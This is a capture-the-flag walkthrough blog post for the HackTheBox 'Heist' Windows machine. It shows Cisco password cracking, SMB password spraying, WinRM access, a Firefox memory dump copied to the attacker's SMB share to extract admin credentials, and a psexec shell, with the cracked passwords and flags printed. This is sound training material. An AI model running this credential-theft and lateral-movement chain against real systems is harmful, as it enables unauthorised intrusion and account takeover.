@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HackTheBox — Heist | jessefmoore</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+
+<header class="site-header">
+<pre class="ascii-logo">     ██╗███████╗███╗   ███╗
+     ██║██╔════╝████╗ ████║
+     ██║█████╗  ██╔████╔██║
+██   ██║██╔══╝  ██║╚██╔╝██║
+╚█████╔╝██║     ██║ ╚═╝ ██║
+ ╚════╝ ╚═╝     ╚═╝     ╚═╝</pre>
+<div class="tagline">Security Advisor | jessefmoore on LinkedIn, X, and GitHub</div>
+</header>
+
+<div class="wrapper">
+
+<aside class="sidebar">
+  <div class="sidebar-label">navigation</div>
+  <nav>
+    <ul>
+      <li><a href="/index.html">~/ home</a></li>
+      <li><a href="/posts/" class="active">~/posts/</a></li>
+      <li><a href="/reports/">~/reports/</a></li>
+    </ul>
+  </nav>
+  <hr class="sidebar-divider">
+  <div class="sidebar-label">on this page</div>
+  <nav>
+    <ul>
+      <li><a href="#recon" style="font-size:12px">Recon</a></li>
+      <li><a href="#creds" style="font-size:12px">Credential Discovery</a></li>
+      <li><a href="#foothold" style="font-size:12px">Foothold</a></li>
+      <li><a href="#privesc" style="font-size:12px">Privesc</a></li>
+    </ul>
+  </nav>
+</aside>
+
+<main class="content">
+
+  <div class="breadcrumb"><span class="prompt">jfm@kali</span>:<span class="path">~/posts/2020-05-16</span>$</div>
+
+  <h1>HackTheBox — Heist</h1>
+
+  <p style="color:var(--muted);font-size:12px;margin-bottom:1.5rem">
+    2020-05-16 &nbsp;·&nbsp;
+    <span style="color:var(--cyan)">HTB</span> &nbsp;
+    <span style="color:var(--cyan)">Windows</span>
+  </p>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163594479-da3881df-dd4d-418d-9a11-f9c5b7e65011.png" alt="Heist machine info" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <p>Target: <code>10.10.10.149</code></p>
+
+  <hr>
+
+  <h2 id="recon">Recon</h2>
+
+  <pre><code>root@kali:~/htb/heist# gedit /etc/hosts
+
+nmap -sS -sV -A -O -p- 10.10.10.149
+nmap -vv 10.10.10.149</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163594525-b8c27faf-81b0-4b97-b166-3c3b786db601.png" alt="nmap output" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <p>We find IIS running on port 80, MSRPC on port 135 and SMB on 445. Additionally, port 5985 (WinRM).</p>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163594597-bef084fc-b3c6-4304-a1c3-0f09dbc7acd0.png" alt="services" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <h3>Website</h3>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163594652-d705ac77-341a-4e92-b6fb-987a2141dcef.png" alt="website" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <p>Login as Guest reveals a Cisco router config attachment:</p>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163594668-d961203d-c52f-4da2-90da-76bd085e84d7.png" alt="login as guest" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <hr>
+
+  <h2 id="creds">Credential Discovery</h2>
+
+  <h3>Cisco Router Config</h3>
+
+  <pre><code>hostname ios-1
+
+security passwords min-length 12
+
+enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+
+username rout3r password 7 0242114B0E143F015F5D1E161713
+
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163594701-c8cbb43e-3ab2-4f7f-b228-463004a67814.png" alt="cisco config" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <h3>Crack Type 5 (MD5) Hash</h3>
+
+  <p>Type 5 password can be cracked via online tools or John:</p>
+
+  <pre><code>echo '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' > cisco5hash
+john --fork=4 -w=rockyou.txt cisco5hash</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163595109-c3191c6b-b276-41c0-b53b-9f686653f170.png" alt="john crack" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <p>Result: <code>stealth1agent</code></p>
+
+  <h3>Crack Type 7 (Cisco VigenÃ¨re) Passwords</h3>
+
+  <p>Type 7 passwords decrypt instantly via online tools:</p>
+  <ul>
+    <li><code>0242114B0E143F015F5D1E161713</code> → <code>$uperP@ssword</code></li>
+    <li><code>02375012182C1A1D751618034F36415408</code> → <code>Q4)sJu\Y8qz*A3?d</code></li>
+  </ul>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163594937-6bd3ad28-0d4f-4d61-a6e1-86f7e819dc8e.png" alt="type7 crack" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <h3>User Enumeration from Website</h3>
+
+  <p>Enumerating the website surfaces users: <code>Hazard</code>, <code>Support Admin</code>, <code>rout3r</code>, <code>admin</code></p>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163595180-09fc296b-0647-4974-93bd-8daed90ad2ab.png" alt="user enum" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <h3>SMB Spray</h3>
+
+  <pre><code># Initial spray
+python3 cme smb 10.10.10.149 -u user.txt -p passwords.txt</code></pre>
+
+  <p>Result: <code>SupportDesk\Hazard:stealth1agent</code></p>
+
+  <h3>RID Brute-Force for More Users</h3>
+
+  <pre><code>python3 cme smb 10.10.10.149 -u Hazard -p stealth1agent --rid-brute</code></pre>
+
+  <p>Finds additional users: <code>Chase</code>, <code>Jason</code></p>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163595332-c211671c-f2d3-496b-a247-6f881462c553.png" alt="rid brute" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <p>Re-spray with full user + password lists:</p>
+
+  <pre><code>python3 cme smb 10.10.10.149 -u user.txt -p passwords.txt</code></pre>
+
+  <p>Hit: <code>Chase:Q4)sJu\Y8qz*A3?d</code></p>
+
+  <hr>
+
+  <h2 id="foothold">Foothold — WinRM</h2>
+
+  <pre><code>python3 cme winrm 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163595484-d006bd8e-f1fe-451b-9e7c-bdf65e0438a9.png" alt="winrm success" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <pre><code>gem install evil-winrm
+ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163595560-aa7aca38-34af-4f75-8151-3f1f44114479.png" alt="evil-winrm shell" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <p>User flag: <code>a127daef77ab6d9d92008653295f59c4</code></p>
+
+  <hr>
+
+  <h2 id="privesc">Privesc — Firefox Memory Dump</h2>
+
+  <p>Firefox is running as Administrator. Dump the process and extract credentials from memory.</p>
+
+  <pre><code>get-process -name firefox</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163595603-47cf29b6-ee2d-431e-9269-f379ebd4dfa3.png" alt="firefox process" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <pre><code># Upload procdump via evil-winrm upload
+*Evil-WinRM* PS C:\Users\Chase\Desktop> .\procdump.exe -accepteula -ma 3004 firefox.dmp</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163595741-083138ec-df42-4577-8ee4-e511975dadfc.png" alt="procdump" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <p>Transfer dump to Kali via impacket smbserver, then use strings to extract credentials:</p>
+
+  <pre><code># Kali
+./smbserver_linux -smb2support -username guest -password guest share2 ~/htb/heist/
+
+# Target
+*Evil-WinRM* PS C:\Users\Chase\Desktop> net use x: \\10.10.14.10\share2 /user:guest guest
+cmd /c copy firefox.dmp X:\</code></pre>
+
+  <pre><code>*Evil-WinRM* PS C:\Users\Chase\Desktop> ./strings.exe -a firefox.dmp | findstr login_password > what.txt</code></pre>
+
+  <p>Extracted credential from Firefox memory:</p>
+  <p><code>localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=</code></p>
+  <p>Password: <code>4dD!5}x/re8]FBuZ</code></p>
+
+  <h3>PSEXEC as Administrator</h3>
+
+  <pre><code>psexec.py 'administrator:4dD!5}x/re8]FBuZ@10.10.10.149'</code></pre>
+
+  <img src="https://user-images.githubusercontent.com/6413570/163596024-3a9d8a66-e611-436a-b5d4-a46c3b37345b.png" alt="psexec" style="max-width:100%;border:1px solid var(--border);margin-bottom:1rem">
+
+  <p>Root flag: <code>50dfa3c6bfd20e2e0d071b073d766897</code></p>
+
+  <hr>
+
+  <p style="margin-top:2rem"><a href="/posts/">← Back to posts</a></p>
+
+</main>
+</div>
+
+</body>
+</html>
